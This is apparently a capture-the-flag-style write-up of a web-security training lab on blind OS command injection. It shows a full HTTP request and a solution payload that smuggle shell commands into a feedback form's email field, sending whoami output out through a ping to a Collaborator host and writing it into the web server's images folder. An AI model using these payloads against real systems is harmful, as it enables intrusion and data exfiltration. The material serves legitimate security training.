# Lab: Blind OS command injection with output redirection
## Description

1. Identified the injection using Burp Scanner and Collaborator:
```yaml
POST /feedback/submit HTTP/1.1
Host: ac861f9a1e413ef6c0c52a5900800069.web-security-academy.net
Cookie: session=YoY20C8NwUBUnU7nLW8Ht14la43wubaZ
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

csrf=5WmSWsKs6ZzYLtuMgiwebzscrjS6SW52&name=test&email=test%40test.com||`ping+-c+1+$(whoami).334eucqdk32x01x4u0m2ousqphv9jy.burpcollaborator.net`&subject=test&message=test
```
2. Although above technically solved the lab and would output the value of `whoami`. The lab was asking for us to output the values into a file on the webserver.
3. Browsing around the site, we can see images are loaded from URLs such as `https://ac861f9a1e413ef6c0c52a5900800069.web-security-academy.net/image?filename=6.jpg` indicating that the image filenames are `6.jpg`.
4. The lab description told us the directory `/var/www/images` where writable

## Solution
```
test%40test.com||`ping+-c+1+$(whoami).334eucqdk32x01x4u0m2ousqphv9jy.burpcollaborator.net`|echo+$(whoami)>/var/www/images/6.jpg
```
